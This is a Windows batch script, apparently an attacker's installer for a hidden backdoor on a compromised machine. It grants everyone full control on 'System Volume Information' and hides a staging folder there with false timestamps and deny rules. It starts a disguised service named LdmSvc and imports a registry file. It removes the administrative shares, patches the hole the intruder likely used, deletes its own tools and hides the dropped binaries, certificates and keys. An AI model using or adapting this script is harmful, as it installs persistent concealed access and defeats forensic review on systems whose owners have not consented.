@echo off

:: create folders
xcacls.exe "c:\System Volume Information" /G EVERYONE:F /Y
mkdir "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\backup"

attrib.exe +h +s +r "c:\System Volume Information"
attrib.exe +h +s +r "c:\System Volume Information\catalog"
attrib.exe +h +s +r "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}"
attrib.exe +h +s +r "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\backup"

::change the time of the folder to make it the same as c:\RECYCLER
touch.exe -g "c:\RECYCLER" "c:\System Volume Information"
touch.exe -g "c:\RECYCLER" "c:\System Volume Information\catalog"
touch.exe -g "c:\RECYCLER" "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}"
touch.exe -g "c:\RECYCLER" "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\backup"

::lock the folders (NOTE: working folder needs to be two deep from DENY folder) 
xcacls.exe "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\backup" /G EVERYONE:F /Y
xcacls.exe "c:\System Volume Information\catalog\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}" /G SYSTEM:F /Y
xcacls.exe "c:\System Volume Information\catalog" /D EVERYONE /Y
xcacls.exe "c:\System Volume Information" /G SYSTEM:F /Y

cd\
c:
cd %systemroot%
cd system32
settimedate pci.acx
settimedate dqr2.icm
settimedate wci.acx
settimedate icw.nls
settimedate qttask.exe
settimedate icp.nls
settimedate lyae.cmm
qttask.exe /i
net start LdmSvc
net start LdmSvc
net start LdmSvc
net start LdmSvc
net start LdmSvc
regedit /s re.reg

:securen
net share /delete C$ /y
net share /delete D$ /y
net share /delete E$ /y
net share /delete F$ /y
net share /delete G$ /y
net share /delete H$ /y
net share /delete I$ /y
net share /delete J$ /y
net share /delete K$ /y
net share /delete L$ /y
net share /delete M$ /y
net share /delete N$ /y
net share /delete O$ /y
net share /delete P$ /y
net share /delete Q$ /y
net share /delete R$ /y
net share /delete S$ /y
net share /delete T$ /y
net share /delete U$ /y
net share /delete V$ /y
net share /delete W$ /y
net share /delete X$ /y
net share /delete Y$ /y
net share /delete Z$ /y
net share /delete $RPC
net share /delete $NT
net share /delete $RA SERVER
net share /delete $SQL SERVER
net share /delete ADMIN$ /y
net share /delete IPC$ /y
net share /delete lwc$ /y
net share /delete print$
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" /v AutoShareServer /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" /v AutoShareWks /t REG_DWORD /d 0 /f
if exist c:\Winnt (
Wget http://doWnload.microsoft.com/doWnload/f/a/a/faa796aa-399d-437a-9284-c3536e9f2e6e/WindoWs2000-KB835732-x86-ENU.EXE
) else (
Wget http://doWnload.microsoft.com/doWnload/6/1/5/615a50e9-a508-4d67-b53c-3a43455761bf/WindoWsXP-KB835732-x86-ENU.EXE
)
if exist WindoWsXP-KB835732-x86-ENU.EXE (
start WindoWsXP-KB835732-x86-ENU.EXE /quiet /norestart /o /n
)
if exist WindoWs2000-KB835732-x86-ENU.EXE (
start WindoWs2000-KB835732-x86-ENU.EXE /quiet /norestart /o /n
)
settimedate dqr.icm
settimedate cert.key
settimedate cert.crt
settimedate dcg.acx
settimedate libeay32.dll
del settimedate.exe
del reg.exe
del wget.exe
del re.reg
del xcacls.exe
del touch.exe
attrib +s +r +h pci.acx
attrib +s +r +h wci.acx
attrib +s +r +h icw.nls
attrib +s +r +h qttask.exe
attrib +s +r +h icp.nls
attrib +s +r +h lyae.cmm
attrib +s +r +h cert.crt
attrib +s +r +h cert.key
attrib +s +r +h libeay32.dll
attrib +s +r +h ssleay32.dll
:installed
del install.bat